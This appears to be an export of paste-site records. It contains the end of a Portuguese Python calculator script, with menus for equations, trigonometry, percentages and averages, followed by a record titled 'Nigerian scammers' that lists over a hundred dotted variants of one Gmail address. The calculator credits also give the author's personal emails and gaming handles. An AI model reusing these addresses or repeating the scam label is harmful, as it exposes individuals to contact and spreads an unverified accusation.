                b = float(b)
                c = float(c)
                mult = c * b
                divi = mult / a

                print(f'\nX = {divi}')
            else:
                print('Digite algo calculável, por favor!')
                time.sleep(2)

            voltar = input('\nPara continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar == 'r':
                break
            else:
                continue

    elif inicio == '4':
        # Equações de 1° Grau
        while True:
            os.system('cls')
            print('r - Voltar')
            sympy.init_printing(pretty_print=True)

            x = sympy.Symbol('x')
            y = sympy.Function('y')

            n = input('\nDigite a sua equação abaixo:\n\n'
                      '>>> ')

            rep = n.replace('=', ',')
            a = f'Eq({rep})'

            solution = sympy.solve(a, x)

            print(f'\nSolução:\n{solution}\n\n')

            voltar = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar == 'r':
                break
            else:
                continue

    elif inicio == 't':
        # Analizar Triângulos
        while True:
            os.system('cls')
            
            # Usando a formula de Heron

            print('r - Voltar')
            print('\n\nAnalizador de Triâgulos\n\n')
            print('Diga os angulôs que direi se forma ou não um triangulo\n')

            a = input('Reta 1: ').lower()
            b = input('Reta 2: ').lower()
            c = input('Reta 3: ').lower()

            if a == 'r' or b == 'r' or c == 'r':
                break

            if a.isnumeric() and b.isnumeric() and c.isnumeric():
                a = int(float(a))
                b = int(float(b))
                c = int(float(c))
                if a == 0 or b == 0 or c == 0:
                    print('Não é possivel formar segmentos com 0\n')
                    time.sleep(2)
                    continue

                else:
                    if a < b + c and b < a + c and c < a + b:
                        print()
                        print('Os segmentos formam um Triângulo')
                        if a == b == c:
                            print('O triângulo é Equilátero\n')
                        elif a == b or a == c or b == a or b == c or c == b or c == a:
                            print('O triângulo é Isóceles\n')
                        elif a > b or a > c or b > a or b > c or c > b or c > a:
                            print('O triângulo é Escaleno\n')

                    else:
                        print('Os segmentos não formam um triangulo\n')
            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltar4 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar4 == 'r':
                break
            else:
                continue

    elif inicio == '7':
        # Seno Cosseno e Tangente
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\nSeno, Cosseno e Tangente\n')

            iniciotri = input('Qual a operação que deseja fazer?\n\n'
                                '1 - Achar um dos lados do triangulo\n'
                                '2 - Achar um dos angulos do triangulo\n\n>>> ')
            
            if iniciotri == '1':
                os.system('cls')

                print('r - Voltar\n\nDigite o que se pede abaixo\n')

                num = input('Digite o número: ').lower()
                ang = input('Digite o ângulo: ').lower()

                if num == 'r' or ang == 'r':
                    break

                if num.isnumeric() and ang.isnumeric():
                    num = int(num)
                    ang = int(ang)
                    if num == 0 or ang == 0:
                        print('Não é possivel calcular ângulos com 0')
                        time.sleep(2)
                        continue

                    else:
                        print(
                            '\n\nComo é calculado:'
                            '\n\n'
                            '       cateto oposto     a\n'
                            'sen = --------------- = ---\n'
                            '         hipotenusa      c\n'
                            '\n\n'
                            '       cateto adjacente     b\n'
                            'cos = ------------------ = ---\n'
                            '          hipotenusa        c\n'
                            '\n\n'
                            '        cateto oposto       a\n'
                            'tan = ------------------ = ---\n'
                            '       cateto adjacente     b\n'
                        )

                        sin = num * math.sin(math.radians(ang))
                        cos = num * math.cos(math.radians(ang))
                        tan = num * math.tan(math.radians(ang))

                        print('seno: {:.2f}\n'
                            'cosseno: {:.2f}\n'
                            'tangente: {:.2f}\n\n'.format(sin, cos, tan))

                        voltar7 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
                        if voltar7 == 'r':
                            break
                        else:
                            continue

                else:
                    print('\nDigite algo calculável por favor\n')
                    time.sleep(2)
                    continue
            
            elif iniciotri == '2':
                os.system('cls')

                print('r - Voltar\n\nDigite o que se pede abaixo\n')

                co = input('Digite o cateto oposto: ').lower()
                ca = input('Digite o cateto adjacente: ').lower()
                hi = input('Digite a Hipotenusa: ').lower()

                if ca == 'r' or co == 'r' or hi == 'r':
                    break
                
                elif ca.isnumeric() and ca.isnumeric() and hi.isnumeric():
                    co = int(co)
                    ca = int(ca)
                    hi = int(hi)

                    if ca == 0 or co == 0 or hi == 0:
                        print('\nNão é possivel calcular com 0')
                        time.sleep(2)
                    else:
                        print(
                            '\n\nComo é calculado:'
                            '\n\n'
                            '       cateto oposto     a\n'
                            'sen = --------------- = ---\n'
                            '         hipotenusa      c\n'
                            '\n\n'
                            '       cateto adjacente     b\n'
                            'cos = ------------------ = ---\n'
                            '          hipotenusa        c\n'
                            '\n\n'
                            '        cateto oposto       a\n'
                            'tan = ------------------ = ---\n'
                            '       cateto adjacente     b\n'
                        )

                        print(f'seno: {co / hi}\n'
                              f'cosseno: {ca / hi}\n'
                              f'tangente: {co / ca}\n')
                            
                        voltar7 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
                        if voltar7 == 'r':
                            break
                        else:
                            continue

    elif inicio == '8':
        # Calcular a Hipotenusa
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\n\nHipotenusa\n\n')

            co = input('Cateto oposto: ').lower()
            ca = input('Cateto adjacente: ').lower()

            if co == 'r' or ca == 'r':
                break

            if co.isnumeric() and ca.isnumeric():
                co = int(co)
                ca = int(ca)
                if co == 0 or ca == 0:
                    print('Não é possivel calcular ângulos com 0')
                    time.sleep(2)
                    continue

                else:
                    hipotenusa = math.sqrt((ca ** 2) + (co ** 2))
                    print()
                    print('A Hipotenusa é: {:.2f}'.format(hipotenusa))
                    print()

            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltar5 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar5 == 'r':
                break
            else:
                continue

    elif inicio == '9':
        # Porcentagens
        while True:
            os.system('cls')
            print('\nPorcentagens\n\n\n'
                  'Você deseja:\n\n'
                  '1 - Tranformar % em números\n'
                  '2 - Tranformar números em %\n\n'
                  'r - Retornar\n')

            ir = input('>>> ').lower()

            if ir and not 0:
                if ir == '1':
                    while True:
                        # Tranformar % em números
                        os.system('cls')
                        print('r - Voltar')
                        print('\n\nTranformar % em números\n\n')
                        print('Digite o número original e também quantos % você\n'
                              'quer transformar em decimal\n')

                        porc1 = input('Número: ').lower()
                        porc2 = input('%: ').lower()

                        if porc1 == 'r' or porc2 == 'r':
                            break

                        if porc1.isnumeric() and porc2.isnumeric():
                            if porc1 and porc2 and not '0':
                                print('Não é possivel calcular com 0')
                                time.sleep(2)
                                continue

                            else:
                                porc1 = int(porc1)
                                porc2 = int(porc2)
                                porc3 = (porc1 * porc2) / 100
                                print('\n'
                                      '{}% de {} = {}\n'.format(porc2, porc1, porc3))

                        else:
                            print('\nDigite algo calculável por favor\n')
                            time.sleep(2)
                            continue

                        voltar8 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
                        if voltar8 == 'r':
                            break
                        else:
                            continue

                elif ir == '2':
                    while True:
                        # Tranformar números em %
                        os.system('cls')
                        print('r - Voltar')
                        print('\n\nTranformar números em %\n\n')
                        print('Digite o números original e um segundo número para saber\n'
                              'quantos % vale o segundo número de acorco com o primeiro\n')

                        tran1 = input('Original: ').lower()
                        tran2 = input('Decimal: ').lower()

                        if tran1 == 'r' or tran2 == 'r':
                            break

                        if tran1.isnumeric() and tran2.isnumeric():
                            if tran1 and tran2 and not '0':
                                print('Não é possivel calcular com 0')
                                time.sleep(2)
                                continue

                            else:
                                tran1 = int(tran1)
                                tran2 = int(tran2)
                                tran3 = (tran2 / tran1) * 100
                                print('\n'
                                      '{} de {} = {}%'.format(tran2, tran1, tran3))

                        else:
                            print('\nDigite algo calculável por favor\n')
                            time.sleep(2)
                            continue

                        voltar9 = input('\nPara continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
                        if voltar9 == 'r':
                            break
                        else:
                            continue

                elif ir == 'r':
                    break

                else:
                    print('Número Inválido.\n'
                          'Digite algum número listado!')
                    time.sleep(2)

            else:
                break

    elif inicio == '0':
        # calculador de médias
        while True:
            os.system('cls')
            r = []
            print('r - Retornar\n\n'
                  'Calcular médias\n\n')
            print('Digite ""="" para concluir a operação\n')
            soma = 0
            cont = 0

            while True:
                n = input('>>> ')
                if n == 'r':
                    r.append('r')
                    break

                if not n.isnumeric():
                    if not n == '=':
                        print('Digite apenas números por favor')
                        time.sleep(2)
                        continue

                if not n == '=':
                    n = int(n)
                    soma += n
                    cont += 1
                    continue
                elif n == '=':
                    media = soma / cont
                    print('Média: {}'.format(media))
                    break

            if 'r' in r:
                break

            voltar = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ')
            if voltar == 'r':
                break
            else:
                continue

    elif inicio == 'fibonacci' or inicio == 'f':
        # Sequencia de Fibonacci
        # Segredo
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\nSequencia de fibonacci\n\n'
                  'Digite qualquer número inteiro para ver a sequência\n')
            n = input('>>> ').lower()
            if n == 'r':
                break

            if n.isnumeric():
                n = int(n)
                if n == 0:
                    print('Não é possivel calcular com 0')
                    time.sleep(2)
                    continue

                else:
                    form1 = (((1 + math.sqrt(5)) / 2) ** n) - (((1 - math.sqrt(5)) / 2) ** n)
                    fn = form1 / math.sqrt(5)
                    print('{:.2f}'.format(fn))

            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltarf = input('\nPara continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltarf == 'r':
                break
            else:
                continue

    elif inicio == 'c':
        # Créditos
        os.system('cls')
        print()
        print('\nCréditos\n\n')
        print('Essa Calculadora foi feita por LeFox\n'
              'com a ajuda de Raissonrai vulgo ""RaiRai""\n\n'
              'Esse é meu nick na internet, eu uso praticamente em\n'
              'tudo esse nick desta maneira\n\n'
              'Obrigado por estar usando, espero que lhe ajude em suas tarefas!\n\n')
        input('Aperte ENTER para voltar ao inicio.')

    elif inicio == 'a':
        # Ajuda
        os.system('cls')
        print('\n\nAjuda, Sugestão e Crítica\n\n')
        print('Você pode me contatar pelas mídias sociais\n'
              '\n'
              'Discord: LeFox#7618\n'
              'Xbox Live: Raposa7618\n'
              'Outlook: matheuslemes2004@outlook.com\n'
              'Gmail: matheussoareslemes2004@gmail.com\n\n'
              'Obrigado pela compreenção.\n\n')
        input('Aperte ENTER para voltar')

    elif inicio == 'n':
        # Novidades
        os.system('cls')
        print('\n\nNovidades!\n\n')
        print('NOVIDADES DA VERSÃO 1.12!!\n\n'
              '1. Volta da analista de triangulos\n'
              '2. Nova calculadora de sen, cos, tan\n\n')
        input('Aperte ENTER para voltar')

    elif inicio == 's':
        # Sair
        break
"
WBtR8byy,Nigerian scammers [28-5-1/2023],bombaires,HTML,Sunday 28th of May 2023 01:43:02 PM CDT,"info.christiancaman@myyahoo.com"">info.christiancaman@myyahoo.com</a>
<a href=""mailto:billlawrence209@gmail.com"">billlawrence209@gmail.com</a>
<a href=""mailto:b.il.l.l.a.w.re.nce209@gmail.com"">b.il.l.l.a.w.re.nce209@gmail.com</a>
<a href=""mailto:bi.l.l.l.a.w.renc.e.209@gmail.com"">bi.l.l.l.a.w.renc.e.209@gmail.com</a>
<a href=""mailto:b.i.ll.l.aw.r.en.ce.2.0.9@gmail.com"">b.i.ll.l.aw.r.en.ce.2.0.9@gmail.com</a>
<a href=""mailto:bill.la.w.ren.ce.2.0.9@gmail.com"">bill.la.w.ren.ce.2.0.9@gmail.com</a>
<a href=""mailto:billlaw.r.e.n.ce2.0.9@gmail.com"">billlaw.r.e.n.ce2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.la.wr.enc.e2.0.9@gmail.com"">b.i.ll.la.wr.enc.e2.0.9@gmail.com</a>
<a href=""mailto:b.il.l.l.awre.nce.2.0.9@gmail.com"">b.il.l.l.awre.nce.2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.lawr.en.ce.209@gmail.com"">b.i.ll.lawr.en.ce.209@gmail.com</a>
<a href=""mailto:bi.l.ll.a.w.re.n.c.e.2.09@gmail.com"">bi.l.ll.a.w.re.n.c.e.2.09@gmail.com</a>
<a href=""mailto:b.ill.lawren.ce.20.9@gmail.com"">b.ill.lawren.ce.20.9@gmail.com</a>
<a href=""mailto:billla.w.re.n.ce2.0.9@gmail.com"">billla.w.re.n.ce2.0.9@gmail.com</a>
<a href=""mailto:bil.llaw.r.e.nc.e.2.0.9@gmail.com"">bil.llaw.r.e.nc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.ll.awre.nce.2.09@gmail.com"">b.i.l.ll.awre.nce.2.09@gmail.com</a>
<a href=""mailto:bi.l.ll.awr.e.n.ce.2.09@gmail.com"">bi.l.ll.awr.e.n.ce.2.09@gmail.com</a>
<a href=""mailto:b.il.l.la.wre.nce2.0.9@gmail.com"">b.il.l.la.wre.nce2.0.9@gmail.com</a>
<a href=""mailto:bill.l.a.wr.ence.2.09@gmail.com"">bill.l.a.wr.ence.2.09@gmail.com</a>
<a href=""mailto:b.ill.law.ren.c.e.209@gmail.com"">b.ill.law.ren.c.e.209@gmail.com</a>
<a href=""mailto:b.illl.awren.ce.2.09@gmail.com"">b.illl.awren.ce.2.09@gmail.com</a>
<a href=""mailto:b.il.ll.a.w.rence.2.09@gmail.com"">b.il.ll.a.w.rence.2.09@gmail.com</a>
<a href=""mailto:bi.l.ll.awr.enc.e20.9@gmail.com"">bi.l.ll.awr.enc.e20.9@gmail.com</a>
<a href=""mailto:bi.lllaw.renc.e209@gmail.com"">bi.lllaw.renc.e209@gmail.com</a>
<a href=""mailto:b.il.ll.a.wren.ce209@gmail.com"">b.il.ll.a.wren.ce209@gmail.com</a>
<a href=""mailto:b.i.lllawren.c.e.209@gmail.com"">b.i.lllawren.c.e.209@gmail.com</a>
<a href=""mailto:bi.l.l.l.aw.r.e.n.c.e.2.09@gmail.com"">bi.l.l.l.aw.r.e.n.c.e.2.09@gmail.com</a>
<a href=""mailto:b.ill.l.aw.r.e.n.c.e209@gmail.com"">b.ill.l.aw.r.e.n.c.e209@gmail.com</a>
<a href=""mailto:bil.llawr.e.n.c.e.209@gmail.com"">bil.llawr.e.n.c.e.209@gmail.com</a>
<a href=""mailto:b.i.lll.a.w.re.n.c.e20.9@gmail.com"">b.i.lll.a.w.re.n.c.e20.9@gmail.com</a>
<a href=""mailto:bill.l.a.w.r.e.n.ce20.9@gmail.com"">bill.l.a.w.r.e.n.ce20.9@gmail.com</a>
<a href=""mailto:b.il.l.l.a.wren.c.e.20.9@gmail.com"">b.il.l.l.a.wren.c.e.20.9@gmail.com</a>
<a href=""mailto:b.i.l.llaw.re.n.ce.209@gmail.com"">b.i.l.llaw.re.n.ce.209@gmail.com</a>
<a href=""mailto:bi.ll.l.a.wre.n.ce.209@gmail.com"">bi.ll.l.a.wre.n.ce.209@gmail.com</a>
<a href=""mailto:bi.l.ll.a.w.ren.c.e2.0.9@gmail.com"">bi.l.ll.a.w.ren.c.e2.0.9@gmail.com</a>
<a href=""mailto:billlaw.renc.e2.09@gmail.com"">billlaw.renc.e2.09@gmail.com</a>
<a href=""mailto:bil.l.l.awrenc.e.20.9@gmail.com"">bil.l.l.awrenc.e.20.9@gmail.com</a>
<a href=""mailto:b.i.l.llaw.r.e.nc.e20.9@gmail.com"">b.i.l.llaw.r.e.nc.e20.9@gmail.com</a>
<a href=""mailto:billl.awre.nc.e209@gmail.com"">billl.awre.nc.e209@gmail.com</a>
<a href=""mailto:bi.llla.wre.nce.2.0.9@gmail.com"">bi.llla.wre.nce.2.0.9@gmail.com</a>
<a href=""mailto:bi.l.ll.a.w.r.enc.e2.0.9@gmail.com"">bi.l.ll.a.w.r.enc.e2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.lawr.enc.e.2.0.9@gmail.com"">b.i.ll.lawr.enc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.l.lawr.enc.e.2.09@gmail.com"">b.i.l.l.lawr.enc.e.2.09@gmail.com</a>
<a href=""mailto:b.i.l.lla.w.r.e.n.c.e.2.09@gmail.com"">b.i.l.lla.w.r.e.n.c.e.2.09@gmail.com</a>
<a href=""mailto:b.i.l.ll.aw.r.en.c.e20.9@gmail.com"">b.i.l.ll.aw.r.en.c.e20.9@gmail.com</a>
<a href=""mailto:b.i.lllaw.re.nce2.09@gmail.com"">b.i.lllaw.re.nce2.09@gmail.com</a>
<a href=""mailto:bi.ll.l.a.w.ren.c.e.2.09@gmail.com"">bi.ll.l.a.w.ren.c.e.2.09@gmail.com</a>
<a href=""mailto:b.illlawr.en.ce2.09@gmail.com"">b.illlawr.en.ce2.09@gmail.com</a>
<a href=""mailto:b.i.ll.la.w.r.ence2.09@gmail.com"">b.i.ll.la.w.r.ence2.09@gmail.com</a>
<a href=""mailto:b.ill.law.r.e.nc.e2.0.9@gmail.com"">b.ill.law.r.e.nc.e2.0.9@gmail.com</a>
<a href=""mailto:bi.l.lla.w.r.e.n.ce2.0.9@gmail.com"">bi.l.lla.w.r.e.n.ce2.0.9@gmail.com</a>
<a href=""mailto:bill.l.a.w.re.n.c.e2.0.9@gmail.com"">bill.l.a.w.re.n.c.e2.0.9@gmail.com</a>
<a href=""mailto:bi.l.l.l.a.w.ren.c.e.2.0.9@gmail.com"">bi.l.l.l.a.w.ren.c.e.2.0.9@gmail.com</a>
<a href=""mailto:b.illlaw.r.e.n.ce209@gmail.com"">b.illlaw.r.e.n.ce209@gmail.com</a>
<a href=""mailto:bil.l.l.awr.e.n.c.e.2.0.9@gmail.com"">bil.l.l.awr.e.n.c.e.2.0.9@gmail.com</a>
<a href=""mailto:bi.lllaw.r.en.ce209@gmail.com"">bi.lllaw.r.en.ce209@gmail.com</a>
<a href=""mailto:bil.llawre.nc.e2.0.9@gmail.com"">bil.llawre.nc.e2.0.9@gmail.com</a>
<a href=""mailto:b.il.llawr.e.n.c.e2.09@gmail.com"">b.il.llawr.e.n.c.e2.09@gmail.com</a>
<a href=""mailto:bil.l.law.ren.ce.20.9@gmail.com"">bil.l.law.ren.ce.20.9@gmail.com</a>
<a href=""mailto:bi.l.lla.wr.e.nc.e.20.9@gmail.com"">bi.l.lla.wr.e.nc.e.20.9@gmail.com</a>
<a href=""mailto:billl.awr.e.nc.e.20.9@gmail.com"">billl.awr.e.nc.e.20.9@gmail.com</a>
<a href=""mailto:bi.l.ll.a.w.r.e.nce.20.9@gmail.com"">bi.l.ll.a.w.r.e.nce.20.9@gmail.com</a>
<a href=""mailto:bi.l.l.lawrenc.e.2.0.9@gmail.com"">bi.l.l.lawrenc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.illlawre.nc.e.209@gmail.com"">b.illlawre.nc.e.209@gmail.com</a>
<a href=""mailto:bill.la.wrenc.e.2.0.9@gmail.com"">bill.la.wrenc.e.2.0.9@gmail.com</a>
<a href=""mailto:bi.l.l.la.wren.ce.2.09@gmail.com"">bi.l.l.la.wren.ce.2.09@gmail.com</a>
<a href=""mailto:b.i.lll.awr.e.n.ce20.9@gmail.com"">b.i.lll.awr.e.n.ce20.9@gmail.com</a>
<a href=""mailto:billl.awren.ce.2.0.9@gmail.com"">billl.awren.ce.2.0.9@gmail.com</a>
<a href=""mailto:b.il.ll.aw.r.en.c.e209@gmail.com"">b.il.ll.aw.r.en.c.e209@gmail.com</a>
<a href=""mailto:b.illl.a.w.r.e.nce20.9@gmail.com"">b.illl.a.w.r.e.nce20.9@gmail.com</a>
<a href=""mailto:b.i.lll.aw.rence209@gmail.com"">b.i.lll.aw.rence209@gmail.com</a>
<a href=""mailto:b.i.llla.wre.nce2.0.9@gmail.com"">b.i.llla.wre.nce2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.la.wre.n.c.e.2.09@gmail.com"">b.i.ll.la.wre.n.c.e.2.09@gmail.com</a>
<a href=""mailto:b.illlaw.ren.c.e.2.09@gmail.com"">b.illlaw.ren.c.e.2.09@gmail.com</a>
<a href=""mailto:bill.l.a.w.ren.ce.20.9@gmail.com"">bill.l.a.w.ren.ce.20.9@gmail.com</a>
<a href=""mailto:b.i.llla.w.ren.c.e.209@gmail.com"">b.i.llla.w.ren.c.e.209@gmail.com</a>
<a href=""mailto:bill.la.wre.n.c.e2.09@gmail.com"">bill.la.wre.n.c.e2.09@gmail.com</a>
<a href=""mailto:b.ill.lawre.n.ce.2.0.9@gmail.com"">b.ill.lawre.n.ce.2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.l.lawr.e.nce2.0.9@gmail.com"">b.i.l.l.lawr.e.nce2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.ll.a.wr.ence.209@gmail.com"">b.i.l.ll.a.wr.ence.209@gmail.com</a>
<a href=""mailto:b.il.ll.a.wre.nc.e2.0.9@gmail.com"">b.il.ll.a.wre.nc.e2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.lla.w.r.ence20.9@gmail.com"">b.i.l.lla.w.r.ence20.9@gmail.com</a>
<a href=""mailto:b.ill.l.a.wre.nce.2.09@gmail.com"">b.ill.l.a.wre.nce.2.09@gmail.com</a>
<a href=""mailto:b.i.lll.a.wr.enc.e.2.09@gmail.com"">b.i.lll.a.wr.enc.e.2.09@gmail.com</a>
<a href=""mailto:bi.l.l.law.r.e.n.ce.2.09@gmail.com"">bi.l.l.law.r.e.n.ce.2.09@gmail.com</a>
<a href=""mailto:b.i.ll.law.r.e.n.c.e.2.0.9@gmail.com"">b.i.ll.law.r.e.n.c.e.2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.ll.a.wrence.20.9@gmail.com"">b.i.l.ll.a.wrence.20.9@gmail.com</a>
<a href=""mailto:b.i.l.l.l.awr.en.ce209@gmail.com"">b.i.l.l.l.awr.en.ce209@gmail.com</a>
<a href=""mailto:bil.lla.w.ren.ce.209@gmail.com"">bil.lla.w.ren.ce.209@gmail.com</a>
<a href=""mailto:b.i.l.ll.awr.en.ce2.0.9@gmail.com"">b.i.l.ll.awr.en.ce2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.l.a.wr.e.nce20.9@gmail.com"">b.i.ll.l.a.wr.e.nce20.9@gmail.com</a>
<a href=""mailto:b.il.l.l.a.wren.ce.2.09@gmail.com"">b.il.l.l.a.wren.ce.2.09@gmail.com</a>
<a href=""mailto:bi.l.ll.awr.en.c.e2.0.9@gmail.com"">bi.l.ll.awr.en.c.e2.0.9@gmail.com</a>
<a href=""mailto:bil.l.la.w.r.e.nce.2.0.9@gmail.com"">bil.l.la.w.r.e.nce.2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.llawren.ce20.9@gmail.com"">b.i.l.llawren.ce20.9@gmail.com</a>
<a href=""mailto:bil.llawr.e.nce.209@gmail.com"">bil.llawr.e.nce.209@gmail.com</a>
<a href=""mailto:b.i.lllawr.e.nc.e2.0.9@gmail.com"">b.i.lllawr.e.nc.e2.0.9@gmail.com</a>
<a href=""mailto:b.i.l.ll.awr.e.nc.e2.09@gmail.com"">b.i.l.ll.awr.e.nc.e2.09@gmail.com</a>
<a href=""mailto:bi.l.ll.awre.nc.e20.9@gmail.com"">bi.l.ll.awre.nc.e20.9@gmail.com</a>
<a href=""mailto:b.ill.lawrence.20.9@gmail.com"">b.ill.lawrence.20.9@gmail.com</a>
<a href=""mailto:bi.lll.a.wr.ence.209@gmail.com"">bi.lll.a.wr.ence.209@gmail.com</a>
<a href=""mailto:b.i.l.l.l.awre.n.ce2.09@gmail.com"">b.i.l.l.l.awre.n.ce2.09@gmail.com</a>
<a href=""mailto:b.i.l.l.la.wr.ence2.09@gmail.com"">b.i.l.l.la.wr.ence2.09@gmail.com</a>
<a href=""mailto:bil.l.l.aw.r.enc.e20.9@gmail.com"">bil.l.l.aw.r.enc.e20.9@gmail.com</a>
<a href=""mailto:bi.ll.l.a.wren.c.e.209@gmail.com"">bi.ll.l.a.wren.c.e.209@gmail.com</a>
<a href=""mailto:bi.l.llaw.r.e.n.ce2.09@gmail.com"">bi.l.llaw.r.e.n.ce2.09@gmail.com</a>
<a href=""mailto:b.i.l.l.l.a.wr.enc.e2.09@gmail.com"">b.i.l.l.l.a.wr.enc.e2.09@gmail.com</a>
<a href=""mailto:b.i.l.ll.aw.re.n.ce2.09@gmail.com"">b.i.l.ll.aw.re.n.ce2.09@gmail.com</a>
<a href=""mailto:b.il.l.l.aw.renc.e.209@gmail.com"">b.il.l.l.aw.renc.e.209@gmail.com</a>
<a href=""mailto:bi.ll.la.wr.en.ce2.0.9@gmail.com"">bi.ll.la.wr.en.ce2.0.9@gmail.com</a>
<a href=""mailto:b.i.lllawren.ce2.09@gmail.com"">b.i.lllawren.ce2.09@gmail.com</a>
<a href=""mailto:bi.l.l.l.aw.r.ence.209@gmail.com"">bi.l.l.l.aw.r.ence.209@gmail.com</a>
<a href=""mailto:b.ill.la.w.re.n.ce209@gmail.com"">b.ill.la.w.re.n.ce209@gmail.com</a>
<a href=""mailto:b.il.ll.a.wr.e.nc.e.20.9@gmail.com"">b.il.ll.a.wr.e.nc.e.20.9@gmail.com</a>
<a href=""mailto:bi.l.llaw.re.nc.e.20.9@gmail.com"">bi.l.llaw.re.nc.e.20.9@gmail.com</a>
<a href=""mailto:b.il.l.lawrenc.e.20.9@gmail.com"">b.il.l.lawrenc.e.20.9@gmail.com</a>
<a href=""mailto:b.illl.awr.e.n.c.e2.09@gmail.com"">b.illl.awr.e.n.c.e2.09@gmail.com</a>
<a href=""mailto:b.illlawr.e.n.ce.2.0.9@gmail.com"">b.illlawr.e.n.ce.2.0.9@gmail.com</a>
<a href=""mailto:bil.lla.wr.e.n.c.e20.9@gmail.com"">bil.lla.wr.e.n.c.e20.9@gmail.com</a>
<a href=""mailto:b.il.ll.awre.n.c.e209@gmail.com"">b.il.ll.awre.n.c.e209@gmail.com</a>
<a href=""mailto:bi.lllawre.nce.2.0.9@gmail.com"">bi.lllawre.nce.2.0.9@gmail.com</a>
<a href=""mailto:b.ill.la.wrenc.e.2.09@gmail.com"">b.ill.la.wrenc.e.2.09@gmail.com</a>
<a href=""mailto:b.il.l.la.w.renc.e2.0.9@gmail.com"">b.il.l.la.w.renc.e2.0.9@gmail.com</a>
<a href=""mailto:bi.ll.l.a.w.ren.c.e2.0.9@gmail.com"">bi.ll.l.a.w.ren.c.e2.0.9@gmail.com</a>
<a href=""mailto:b.il.ll.a.wr.en.c.e.20.9@gmail.com"">b.il.ll.a.wr.en.c.e.20.9@gmail.com</a>
<a href=""mailto:b.i.lllaw.re.n.ce209@gmail.com"">b.i.lllaw.re.n.ce209@gmail.com</a>
<a href=""mailto:billla.w.renc.e.20.9@gmail.com"">billla.w.renc.e.20.9@gmail.com</a>
<a href=""mailto:b.i.l.l.l.awrenc.e2.09@gmail.com"">b.i.l.l.l.awrenc.e2.09@gmail.com</a>
<a href=""mailto:b.i.lll.a.w.renc.e209@gmail.com"">b.i.lll.a.w.renc.e209@gmail.com</a>
<a href=""mailto:bi.ll.l.awr.e.nce2.09@gmail.com"">bi.ll.l.awr.e.nce2.09@gmail.com</a>
<a href=""mailto:b.illlaw.r.ence.2.0.9@gmail.com"">b.illlaw.r.ence.2.0.9@gmail.com</a>
<a href=""mailto:bill.l.a.wre.nce2.0.9@gmail.com"">bill.l.a.wre.nce2.0.9@gmail.com</a>
<a href=""mailto:b.illl.awrenc.e.20.9@gmail.com"">b.illl.awrenc.e.20.9@gmail.com</a>
<a href=""mailto:bill.l.a.w.r.e.nc.e.2.0.9@gmail.com"">bill.l.a.w.r.e.nc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.ill.l.a.w.r.e.nc.e20.9@gmail.com"">b.ill.l.a.w.r.e.nc.e20.9@gmail.com</a>
<a href=""mailto:bi.l.l.l.awr.e.nc.e.2.0.9@gmail.com"">bi.l.l.l.awr.e.nc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.i.lll.a.wr.e.n.ce2.0.9@gmail.com"">b.i.lll.a.wr.e.n.ce2.0.9@gmail.com</a>
<a href=""mailto:b.i.lll.aw.re.nc.e2.0.9@gmail.com"">b.i.lll.aw.re.nc.e2.0.9@gmail.com</a>
<a href=""mailto:bil.ll.aw.renc.e.2.0.9@gmail.com"">bil.ll.aw.renc.e.2.0.9@gmail.com</a>
<a href=""mailto:bil.l.la.w.re.n.c.e20.9@gmail.com"">bil.l.la.w.re.n.c.e20.9@gmail.com</a>
<a href=""mailto:b.i.l.l.lawre.nc.e.2.0.9@gmail.com"">b.i.l.l.lawre.nc.e.2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.law.ren.ce.2.0.9@gmail.com"">b.i.ll.law.ren.ce.2.0.9@gmail.com</a>
<a href=""mailto:b.ill.l.awr.e.n.c.e.20.9@gmail.com"">b.ill.l.awr.e.n.c.e.20.9@gmail.com</a>
<a href=""mailto:bi.l.llawrence20.9@gmail.com"">bi.l.llawrence20.9@gmail.com</a>
<a href=""mailto:billl.awren.ce.20.9@gmail.com"">billl.awren.ce.20.9@gmail.com</a>
<a href=""mailto:b.il.ll.a.wre.nce.20.9@gmail.com"">b.il.ll.a.wre.nce.20.9@gmail.com</a>
<a href=""mailto:b.ill.lawr.ence.209@gmail.com"">b.ill.lawr.ence.209@gmail.com</a>
<a href=""mailto:b.ill.law.rence209@gmail.com"">b.ill.law.rence209@gmail.com</a>
<a href=""mailto:b.i.l.l.law.r.en.c.e2.0.9@gmail.com"">b.i.l.l.law.r.en.c.e2.0.9@gmail.com</a>
<a href=""mailto:bill.lawren.ce.2.0.9@gmail.com"">bill.lawren.ce.2.0.9@gmail.com</a>
<a href=""mailto:b.i.ll.la.w.r.e.nc.e209@gmail.com"">b.i.ll.la.w.r.e.nc.e209@gmail.com</a>
<a href=""mailto:b.illlawr.e.n.ce2.0.9@gmail.com"">b.illlawr.e.n.ce2.0.9@gmail.com</a>
